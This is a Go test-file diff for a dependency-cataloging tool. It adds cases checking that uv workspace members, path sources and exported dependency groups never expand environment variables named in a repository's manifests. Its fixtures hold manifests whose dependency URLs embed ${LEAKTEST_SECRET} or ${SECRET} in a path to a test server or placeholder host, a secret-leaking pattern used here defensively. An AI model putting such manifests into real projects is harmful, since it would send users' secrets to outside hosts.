@@ -325,8 +325,19 @@ func TestUVNeverExpandsRepositoryEnvVars(t *testing.T) {
 		"remote constraint": {"requirements.txt": "-c " + srv.URL + "/deps.txt\nrequests\n"},
 		// uv export re-locks a stale uv.lock from every list uv locks, not
 		// only [project]'s (verified against uv 0.11).
-		"dependency group (export)":              {"pyproject.toml": exportProject("[dependency-groups]\ndev = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
-		"tool.uv dev-dependencies (export)":      {"pyproject.toml": exportProject("[tool.uv]\ndev-dependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
+		"dependency group (export)":         {"pyproject.toml": exportProject("[dependency-groups]\ndev = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
+		"tool.uv dev-dependencies (export)": {"pyproject.toml": exportProject("[tool.uv]\ndev-dependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
+		// uv locks every workspace member and reads every path source's
+		// pyproject (both verified against uv 0.11, export and pip compile).
+		"workspace member (export)": {
+			"pyproject.toml":            exportProject("[tool.uv.workspace]\nmembers = [\"packages/*\"]\n"),
+			"uv.lock":                   staleUVLock,
+			"packages/a/pyproject.toml": "[project]\nname = \"a\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n",
+		},
+		"path source": {
+			"pyproject.toml":                "[project]\nname = \"app\"\nversion = \"0.1.0\"\nrequires-python = \">=3.9\"\ndependencies = [\"lib\"]\n\n[tool.uv.sources]\nlib = { path = \"vendor-src/lib\" }\n",
+			"vendor-src/lib/pyproject.toml": "[project]\nname = \"lib\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n",
+		},
 		"tool.uv override-dependencies (export)": {"pyproject.toml": exportProject("[tool.uv]\noverride-dependencies = [\"idna @ " + srv.URL + "/${LEAKTEST_SECRET}/idna-3.7-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
 	}
 	for name, files := range cases {
@@ -337,7 +348,7 @@ func TestUVNeverExpandsRepositoryEnvVars(t *testing.T) {
 			mu.Unlock()
 			proj := t.TempDir()
 			writeTree(t, proj, files)
-			ctx := warn.NewContext(context.Background(), false)
+			ctx := warn.NewContext(context.Background(), true) // verbose: two manifests fail where a member or source does
 			if _, err := Catalog(ctx, proj, Options{SkipVersionLookup: true}); err != nil {
 				t.Fatal(err)
 			}
@@ -482,5 +493,28 @@ func TestShlexSplitUsesPythonWhitespace(t *testing.T) {
 		if err != nil || !slices.Equal(got, want) {
 			t.Errorf("shlexSplit(%q) = %q, %v; want %q", in, got, err, want)
 		}
+	}
+}
+
+// uvProjectExpandsEnv reads what uv reads beside a manifest: a clean workspace
+// passes, a member is refused for a sibling it is locked with, and a glob it
+// cannot list refuses rather than reading less.
+func TestUVProjectExpandsEnvFollowsTheWorkspace(t *testing.T) {
+	ws := "[project]\nname = \"root\"\nversion = \"0.1.0\"\n\n[tool.uv.workspace]\nmembers = [\"packages/*\"]\n"
+	clean := "[project]\nname = \"a\"\nversion = \"0.1.0\"\ndependencies = [\"idna\"]\n"
+	dirty := "[project]\nname = \"b\"\nversion = \"0.1.0\"\ndependencies = [\"x @ https://h/${SECRET}/x.whl\"]\n"
+	dir := t.TempDir()
+	writeTree(t, dir, map[string]string{"pyproject.toml": ws, "packages/a/pyproject.toml": clean})
+	if err := uvProjectExpandsEnv(filepath.Join(dir, "pyproject.toml"), dir); err != nil {
+		t.Errorf("clean workspace: %v", err)
+	}
+	writeTree(t, dir, map[string]string{"packages/b/pyproject.toml": dirty})
+	if err := uvProjectExpandsEnv(filepath.Join(dir, "packages", "a", "pyproject.toml"), dir); !errors.Is(err, errNamesEnvVar) {
+		t.Errorf("member with a dirty sibling: err = %v, want errNamesEnvVar", err)
+	}
+	other := t.TempDir()
+	writeTree(t, other, map[string]string{"pyproject.toml": strings.Replace(ws, "packages/*", "packages/**", 1)})
+	if err := uvProjectExpandsEnv(filepath.Join(other, "pyproject.toml"), other); !errors.Is(err, errUVProjectUnplaced) {
+		t.Errorf("** glob: err = %v, want errUVProjectUnplaced", err)
 	}
 }
